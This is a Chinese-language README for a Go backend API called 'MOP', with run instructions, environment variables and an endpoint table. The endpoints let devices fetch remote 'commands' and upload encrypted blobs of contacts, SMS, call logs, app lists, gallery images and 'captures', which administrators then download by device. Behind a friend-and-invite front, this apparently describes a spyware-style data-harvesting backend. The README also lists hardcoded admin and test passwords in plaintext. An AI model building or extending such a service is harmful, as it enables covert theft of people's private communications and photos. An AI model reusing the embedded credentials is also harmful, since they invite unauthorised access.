# MOP 后端 API

规约见项目根目录 `PROTOCOL.md`。本服务提供 REST API：登录、资料补全、邀请、好友、设备指令、审计占位及管理端接口。

## 技术栈

- Go 1.21+
- Chi 路由
- SQLite（modernc.org/sqlite，无 CGO）
- 密码：bcrypt
- CORS：已启用，便于用户端网页与管理端从浏览器跨域调用

## 本地运行

```bash
cd api
go mod tidy
go run .
```

默认监听 `:80`，数据文件 `./mop.db`。可通过环境变量覆盖：

- `PORT` 监听端口（默认 80）
- `DB_PATH` SQLite 路径（默认 ./mop.db）
- `API_HOST` 对外 API 地址（用于邀请链接，默认 https://api.sdkdns.top）
- `WEB_HOST` 用户端网页域名（用于邀请链接，默认 https://web.sdkdns.top）
- `TERMS_VERSION` 当前用户须知版本号（默认 1）
- `ADMIN_TOKEN` 管理端鉴权 Token（不设则管理端接口 403）；管理端登录见下节
- `ADMIN_USERNAME` / `ADMIN_PASSWORD` 可选，与环境变量一致时校验通过并返回 `admin_token`
- `BUILD_TOKEN` build-sync 鉴权（Header: X-Build-Token）；不设则 POST /api/v1/internal/build-sync 返回 403

**内置账户（开发/测试）**：管理端支持内置管理员 **zhanan089 / zn666@**（超级管理员）、**zn0000 / zn0000**（管理员）；App 登录支持种子用户 **user123 / 123456**（api 启动时若不存在则自动创建）。详见项目根目录 [dev-env/README.md](../dev-env/README.md) 第 5 节。

**build-sync**：CI 或构建脚本可向 **api** 发送 `POST /api/v1/internal/build-sync`，Header 带 `X-Build-Token: <BUILD_TOKEN>`，Body 见 PROTOCOL 第 5 节。管理端通过 `GET /api/v1/admin/builds`（需 admin 鉴权）拉取列表并在 APK 下载页展示。

## Docker 构建（与 deploy 配合）

在项目根目录执行：

```bash
docker compose -f deploy/docker-compose.yml build api
docker compose -f deploy/docker-compose.yml up -d
```

API 数据持久化在 volume `mop-api-data`（/data）。

## 已实现接口摘要

| 路径 | 方法 | 鉴权 | 说明 |
|------|------|------|------|
| /health | GET | 无 | 健康检查 |
| /api/v1/auth/login | POST | 无 | 账密登录（返回 access_token、refresh_token、uid、host） |
| /api/v1/auth/refresh | POST | 无 | 用 refresh_token 换新 access_token（Body 或 Header Refresh-Token） |
| /api/v1/user/enroll | POST | 无 | 资料补全与设备绑定 |
| /api/v1/invite/validate | GET | 无 | 校验邀请码 |
| /api/v1/config | GET | 用户 | terms_version 等 |
| /api/v1/device/commands | GET | 用户 | 待执行指令 |
| /api/v1/invite/generate | POST | 用户 | 生成邀请 |
| /api/v1/user/search | GET | 用户 | 精确搜索用户 |
| /api/v1/user/friends | GET | 用户 | 好友列表 |
| /api/v1/friend/request | POST | 用户 | 添加好友 |
| /api/v1/audit/check-sum | POST | 用户 | 审计摘要：Body `{device_id, data_types: {type: hash}}`，返回需更新的类型数组 |
| /api/v1/audit/upload | POST | 用户 | 审计上报：Header `X-Device-Id`、`X-Audit-Type` 必填，`X-Audit-Msg-Id`、`X-Audit-Hash` 选填；Body 为加密二进制，落库 |
| /api/v1/user/profile | GET/PATCH | 用户 | 资料与简介 |
| /api/v1/user/change-password | POST | 用户 | 修改密码 |
| /api/v1/user/avatar | POST | 用户 | 上传头像 |
| /api/v1/admin/* | GET/POST | 管理端 Token | 设备/用户/关系/下发指令、builds、audit 查询（占位） |
| /api/v1/admin/audit/contacts、sms、call_log、app_list、gallery、captures | GET | 管理端 Token | 按 device_id 查询审计元数据（id、type、msg_id、created_at、size），不返回 payload |
| /api/v1/admin/audit/blob/:id | GET | 管理端 Token | 下载单条审计 payload（application/octet-stream） |
| /api/v1/internal/build-sync | POST | X-Build-Token | 构建同步（version、build、file_name、download_url、change_log） |
